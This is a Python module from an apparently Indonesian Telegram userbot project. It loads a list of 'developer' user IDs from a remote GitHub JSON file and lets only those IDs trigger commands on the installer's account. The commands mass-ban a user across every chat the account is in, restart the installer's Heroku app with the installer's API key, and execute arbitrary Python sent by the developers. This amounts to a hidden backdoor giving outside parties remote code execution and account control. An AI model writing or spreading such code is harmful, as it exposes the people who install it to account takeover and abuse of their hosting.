# Copyright (C) 2020-2021 by Toni880@Github, < https://github.com/Toni880 >.
#
# This file is part of < https://github.com/Toni880/Prime-Userbot > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/Toni880/Prime-Userbot/blob/master/LICENSE >
# kenkan
#
# All rights reserved.

import asyncio
import sys
import traceback
import heroku3

from random import choice
from pyrogram import filters, enums
from requests import get
from pyrogram.errors import PeerIdInvalid
from Prime import app
from config import HEROKU_API, HEROKU_APP_NAME
from io import StringIO
from Prime.modules.dev import aexec

DEVS = get(
    "https://raw.githubusercontent.com/BukanDev/Prime-Json/master/dev.json"
).json()

WHITELIST = [
    1663258664,
    1952447412,
    1738637033,
    1204218683,
    2142721998,
    1416529201,
    883761960,
    883761960,
    2056126457,
    1816421562,
    5159021081,
]

absen = [
    "**Hadir bang Owner** 😁",
    "**Hadir kak Owner** 😉",
    "**Hadir dong Mas Owner** 😁",
    "**Hadir Owner Ganteng** 🥵",
    "**Hadir Owner Tampan** 😎",
    "**Hadir kak Owner maap telat** 🥺",
]


@app.on_message(filters.command("cgban", ".") & filters.user(DEVS))
async def cgban(client, message):
    kontol = await message.reply_text("Processing gban user")
    cmd = message.command
    if not message.reply_to_message and len(cmd) == 1:
        get_user = message.from_user.id
    elif len(cmd) == 1:
        get_user = message.reply_to_message.from_user.id
    elif len(cmd) > 1:
        get_user = cmd[1]
        try:
            get_user = int(cmd[1])
        except ValueError:
            pass
    try:
        user = await client.get_users(get_user)
    except PeerIdInvalid:
        await kontol.edit_text("Tidak menemukan user tersebut.")
        return

    iso = 0
    gagal = 0
    prik = user.id
    async for dialog in app.get_dialogs():
        chat_type = dialog.chat.type
        if chat_type in [
        enums.ChatType.GROUP,
        enums.ChatType.SUPERGROUP,
        enums.ChatType.CHANNEL,
        ]:
            chat = dialog.chat.id
            if prik in DEVS:
                await message.edit_text("Anda tidak bisa gban dia karena dia pembuat saya")
            if prik in WHITELIST:
                await message.edit_text("Anda tidak bisa gban dia karena dia admin @PrimeSupportGroup")
                return
            elif prik not in DEVS and prik not in WHITELIST:
                try:
                    await app.ban_chat_member(chat, prik)
                    iso = iso + 1
                    await asyncio.sleep(0.1)
                    await kontol.delete()
                except:
                    gagal = gagal + 1
                    await asyncio.sleep(0.1)

    return await app.send_message(
        message.chat.id,
        f"Global Banned \n\nTerbanned: {iso} Chats \nGagal Banned: {gagal} Chats\nKorban: [{user.first_name}](tg://user?id={prik})",
    )
    await kontol.delete()


@app.on_message(filters.command("cungban", ".") & filters.user(DEVS))
async def cungban(client, message):
    kontol = await message.reply_text("Processing ungban user")
    cmd = message.command
    if not message.reply_to_message and len(cmd) == 1:
        get_user = message.from_user.id
    elif len(cmd) == 1:
        get_user = message.reply_to_message.from_user.id
    elif len(cmd) > 1:
        get_user = cmd[1]
        try:
            get_user = int(cmd[1])
        except ValueError:
            pass
    try:
        user = await client.get_users(get_user)
    except PeerIdInvalid:
        await kontol.edit_text("Tidak menemukan user tersebut.")
        return

    iso = 0
    gagal = 0
    prik = user.id
    async for dialog in app.get_dialogs():
        chat_type = dialog.chat.type
        if chat_type in [
        enums.ChatType.GROUP,
        enums.ChatType.SUPERGROUP,
        enums.ChatType.CHANNEL,
        ]:
            chat = dialog.chat.id
            if prik not in DEVS and prik not in WHITELIST:
                try:
                    await app.unban_chat_member(chat, prik)
                    iso = iso + 1
                    await asyncio.sleep(0.1)
                    await kontol.delete()
                except:
                    gagal = gagal + 1
                    await asyncio.sleep(0.1)

    return await app.send_message(
        message.chat.id,
        f"Unglobal Banned \n\nUngbanned: {iso} Chats \nGagal Unbanned: {gagal} Chats\nKorban: [{user.first_name}](tg://user?id={prik})",
    )

@app.on_message(filters.command("prime", ".") & filters.user(DEVS))
async def prime(client, message):
    await message.reply(choice(absen))

@app.on_message(filters.command("crestart", ".") & filters.user(DEVS))
async def crestart(client, message):
    try:
        tai = await message.reply(
            "Restarting your Userbot, It will take few minutes, Please Wait"
        )
        heroku_conn = heroku3.from_key(HEROKU_API)
        server = heroku_conn.app(HEROKU_APP_NAME)
        server.restart()
    except Exception as e:
        await tai.edit(
            f"Your `HEROKU_APP_NAME` or `HEROKU_API` is Wrong or Not Filled, Please Make it correct or fill it \n\nError: ```{e}```"
        )


@app.on_message(filters.command("ce", ".") & filters.user(DEVS))
async def evaluate(client, message):
    status_message = await message.reply("`Running ...`")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        await status_message.delete()
        return
    reply_to_id = message.id
    if message.reply_to_message:
        reply_to_id = message.reply_to_message.message.id
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"<b>Command:</b>\n<code>{cmd}</code>\n\n<b>OUTPUT</b>:\n<code>{evaluation.strip()}</code>"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(final_output))
        await message.reply_document(
            document=filename,
            caption=cmd,
            disable_notification=True,
            reply_to_message_id=reply_to_id,
        )
        os.remove(filename)
        await status_message.delete()
    else:
        await status_message.edit(final_output)
